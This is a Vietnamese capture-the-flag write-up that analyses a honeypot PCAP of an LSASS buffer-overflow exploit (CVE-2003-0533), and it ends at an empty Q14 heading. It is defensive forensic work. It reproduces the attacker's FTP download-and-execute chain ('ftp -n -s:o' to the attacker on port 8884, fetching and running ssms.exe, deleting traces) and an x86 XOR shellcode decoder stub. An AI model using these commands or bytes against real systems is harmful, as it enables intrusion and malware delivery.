# HoneyBOT Lab
## 1. Bối cảnh 


Bài Lab là một bài tập phân tích PCAP minh họa cách kẻ tấn công tương tác với honeypot và cách việc khai thác tự động diễn ra. Địa chỉ IP của nạn nhân đã được thay đổi để che giấu vị trí thật.

Nhiệm vụ của mình là đóng vai chuyên viên SOC: phân tích lưu lượng mạng bằng Wireshark và các công cụ hỗ trợ để dựng lại vụ xâm nhập, xác định exploit được sử dụng, trích xuất mã độc được tải về, phân tích shellcode để tìm hiểu kỹ thuật của kẻ tấn công, từ đó thu thập các IOCs. Công cụ sử dụng trong bài: Brim, NetworkMiner, Wireshark, Libemu (sctest), scdbg, IP LookUp.

## 2. Điều tra

### Q1: What is the attacker's IP address?

- Mình sẽ truy cập `Statistics → Conversations` và chọn tab `IPv4` để xem toàn bộ các cặp địa chỉ IP tham gia trao đổi dữ liệu.


<img width="1552" height="236" alt="image" src="https://github.com/user-attachments/assets/8d2e9ef1-4f73-469e-836d-4017131ea4cc" />

- Bảng thống kê chỉ ghi nhận duy nhất một cặp địa chỉ IPv4 giao tiếp với nhau trong suốt `16.2192` giây là `98.114.205.102` và `192.150.11.111`.

- Sau đó mình dùng bộ lọc `tcp.flags.syn == 1 && tcp.flags.ack == 0` để kiểm tra các gói tin mở kết nối TCP ban đầu.


<img width="1917" height="312" alt="image" src="https://github.com/user-attachments/assets/b2f0d582-3431-4249-ac68-ce2dbdd1d452" />

- Quan sát các gói tin đầu tiên cho thấy địa chỉ **`98.114.205.102`** chủ động khởi tạo kết nối từ giây `0.000000` và giây `0.134550` (**Packet 5**, cổng nguồn `1828`) tới cổng dịch vụ **TCP 445** (SMB/RPC) trên máy honeypot **`192.150.11.111`** .

### Q2: What is the target's IP address?

- Từ kết quả ở Q1 ta có thể thấy được rất rõ kẻ tấn công đang nhắm vào máy chủ honeybot có IP là `192.150.11.111` đang phải hứng chịu các yêu cầu kết nối khai thác lỗ hổng.

### Q3: Provide the country code for the attacker's IP address (a.k.a geo-location).

- Từ Q1 mình đã tìm được IP của kẻ tấn công là `98.114.205.102`. Sau đó mình tiến hành tra cứu IP này trên IPInfo thì biết được nó xuất phát từ ` United States`.

### Q4: How many TCP sessions are present in the captured traffic?

- Ở câu này mình sẽ dùng `Statistics → Conversations` để phân tích. Ngay tại giao diện mình thấy được có tổng `5` phiên kết nối TCP.


 <img width="1663" height="253" alt="image" src="https://github.com/user-attachments/assets/75f7f33f-cc76-4880-a19c-70d82347beab" />

### Q5: How long did it take to perform the attack (in seconds)?

- Mình sẽ truy cập menu `Statistics → Capture File Properties`, ở đây mình nhìn vào mục Time, hệ thống ghi nhận gói tin đầu tiên bắt đầu lúc 2009-04-20 10:28:28, gói tin cuối cùng kết thúc lúc 2009-04-20 10:28:44, tương ứng tổng thời gian trôi qua (Elapsed) là 00:00:16 (16 giây).

### Q6: Provide the CVE number of the exploited vulnerability.

- Mình truy cập menu `Statistics → Protocol Hierarchy` để xem cấu trúc phân cấp toàn bộ các giao thức xuất hiện trong lưu lượng mạng.

- Quan sát cây giao thức cho thấy bên trong lớp truyền tải TCP (`445`) và SMB có sự xuất hiện của giao thức gọi thủ tục từ xa `DCERPC` cùng dịch vụ `DSSETUP`.


<img width="1508" height="335" alt="image" src="https://github.com/user-attachments/assets/2a764179-19aa-4c92-979f-af3320e608a0" />

- Sau đó mình dùng bộ lọc `dcerpc`** để cô lập các gói tin giao tiếp RPC.


<img width="1917" height="272" alt="image" src="https://github.com/user-attachments/assets/fe44abcd-6dd6-42bd-8d81-89f9d2ee851d" />

- Tại **Packet 26** (`DCERPC Bind`), kẻ tấn công gửi yêu cầu liên kết tới giao diện **`DSSETUP`** và được máy nạn nhân phản hồi chấp nhận tại **Packet 28** (`Bind_ack`).

- Ngay sau đó tại **Packet 33** , kẻ tấn công thực thi lệnh gọi hàm **`DsRoleUpgradeDownlevelServer`** với dữ liệu tải trọng có kích thước lớn bất thường (`Long frame (3208 bytes)`) nhằm nhồi chuỗi gây tràn bộ đệm và shellcode vào tiến trình `LSASS`.

- Sau khi mình tìm hiểu thì biết được lỗ hổng tràn bộ đệm ngăn xếp (*Stack-based Buffer Overflow*) trong hàm `DsRoleUpgradeDownlevelServer` thuộc giao diện **`DSSETUP`** của dịch vụ Windows LSASS có mã định danh chính thức là `CVE-2003-0533`.

### Q7: Which protocol was used to carry over the exploit?

- Mình tiếp tục dùng kết quả truy cập menu `Statistics → Protocol Hierarchy` để theo dõi thứ tự phân lớp các giao thức từ tầng vận chuyển lên tầng ứng dụng.

- Cây giao thức hiển thị luồng dữ liệu đi theo cấu trúc `TCP (cổng 445) → NetBIOS Session Service → SMB → DCE/RPC → DSSETUP`, xác nhận toàn bộ các lệnh gọi thủ tục từ xa phục vụ việc khai thác lỗ hổng đều được vận chuyển bên trong giao thức **`SMB`**.

### Q8: Which protocol did the attacker use to download additional malicious files to the target system?

- Mình truy cập menu `Statistics → Conversations` và chuyển sang tab `TCP`. Tại đây mình phát hiện được ngay sau hai luồng khai thác cổng `445`  , kẻ tấn công (`98.114.205.102:1924`) chủ động kết nối vào cổng lạ `1957` trên máy nạn nhân (`192.150.11.111`). Đây là kết nối điều khiển từ xa thông qua do shellcode mở ra.

<img width="1632" height="207" alt="image" src="https://github.com/user-attachments/assets/792abaa4-6443-4900-839e-3e7ce5cccc7a" />

- Ngay sau đó mình đã xem chi tiết dòng hội thoại Stream ID: 2 này để xem toàn bộ nội dung lệnh được truyền đi. Mình phát hiện được một chuỗi lệnh Windows CMD.

<img width="1151" height="171" alt="image" src="https://github.com/user-attachments/assets/5c9d4c3e-ec1d-4d45-9ae6-3e33a47d94be" />


- Kẻ tấn công ghi tham số kết nối vào tệp tạm `o`, dùng lệnh `ftp -n -s:o` để kết nối ngược về `98.114.205.102:8884` , tải tệp mã độc `ssms.exe`, xóa tệp `o` (`del /F /Q o`) để xóa dấu vết rồi thực thi trực tiếp `ssms.exe`.

- Từ đó mình kết luận giao thức kẻ tấn công sử dụng để tải thêm tệp độc hại là `FTP`.

### Q9: What is the name of the downloaded malware?

- Từ kết quả Q8 mình cũng xác định được tên tệp độc hại được tải xuống đó chính là `ssms.exe`


### Q10: The attacker's server was listening on a specific port. Provide the port number.

- Cũng từ nội dung Q8 mình ghi nhận được chuỗi lệnh thực thi `open 0.0.0.0 8884`, yêu cầu máy nạn nhân kết nối tới dịch vụ FTP đang mở sẵn trên cổng `8884` của máy chủ tấn công.

### Q11: When was the involved malware first submitted to VirusTotal for analysis? Format: YYYY-MM-DD

- Mình tiếp tục dùng kết quả truy cập `Statistics → Conversations (tab TCP)` và thấy rằng `Stream ID: 4(98.114.205.102:2152 → 192.150.11.111:1080)` có dung lượng lớn đột biến (`173 kB`, `271` gói tin).

<img width="1642" height="202" alt="image" src="https://github.com/user-attachments/assets/b0ba679c-933e-42f7-bbb7-e0f98df76437" />


- Mình chọn dòng `Stream ID: 4` để xem chi tiết, sau đó quan sát thấy chữ ký nhận diện tệp thực thi Windows (`MZ`) ngay đầu luồng dữ liệu — xác nhận đây là kênh truyền dữ liệu `Active FTP` đang tải tệp `ssms.exe` về máy nạn nhân.

<img width="1917" height="1007" alt="image" src="https://github.com/user-attachments/assets/ed5c64fd-c706-41e2-9d17-93ee61c6f514" />

- Mình tiếp tục chuyển sang chế độ hiện thị `Raw` để bảo toàn dữ liệu và tải tệp về. Sau đó mình tính hash của file và đưa lên VirusTotal để phân tích. Kết quả tại trường `First Submission`, ghi nhận mẫu mã độc được gửi lên phân tích lần đầu vào lúc `2007-06-27 08:47:05 UTC`.

<img width="697" height="182" alt="image" src="https://github.com/user-attachments/assets/4b440a84-0ddd-45c2-97da-25a85ce580eb" />

### Q12: What is the key used to encode the shellcode?

- Từ bảng `Statistics → Conversations (tab TCP)`,mình xác định phiên kết nối SMB thứ hai `Stream ID: 1 (98.114.205.102:1828 → 192.150.11.111:445`, tổng dung lượng `5111 bytes`) là luồng chứa gói tin khai thác lỗ hổng LSASS (`DsRolerUpgradeDownlevelServer request` tại `Packet 33`).

- Sau đó mình xem chi tiết luồng này và chuyển chế độ hiển thị sang `Hex Dump`.

<img width="1917" height="1007" alt="image" src="https://github.com/user-attachments/assets/7fb5fc31-20d1-4c8e-aa89-a2bde94ccb4e" />

- Từ offset `000003E9` đến `00000489`, xuất hiện dãy byte `90 90 90...` đóng vai trò "đường băng" dẫn con trỏ lệnh CPU trượt an toàn vào đầu đoạn mã thực thi khi kích hoạt tràn bộ đệm.
- Nối tiếp ngay sau dãy `90` chính là đoạn mã giải mã x86 dài 23 byte không bị mã hóa: `eb 10 5a 4a 33 c9 66 b9 7d 01 80 34 0a 99 e2 fa eb 05 e8 eb ff ff ff`

- Tại dòng `00000499`, cụm 4 byte `80 34 0a 99` dịch sang hợp ngữ là `xor byte ptr [edx+ecx], 0x99`, được nhúng trực tiếp khóa giải mã `0x99` vào câu lệnh để CPU giải mã ngược `381` byte (`0x017d`) shellcode phía sau ngay trong RAM.

### Q13: What is the port number the shellcode binds to?

- Mình sẽ tiếp tục kiểm tra bảng `Statistics → Conversations (tab TCP)`, ghi nhận ngay sau khi gói tin khai thác `Packet 33` (`tcp.stream eq 1`) được thực thi, kẻ tấn công  lập tức mở kết nối TCP tới cổng `1957` trên máy nạn nhân tại `Stream ID: 2`.

### Q14: 

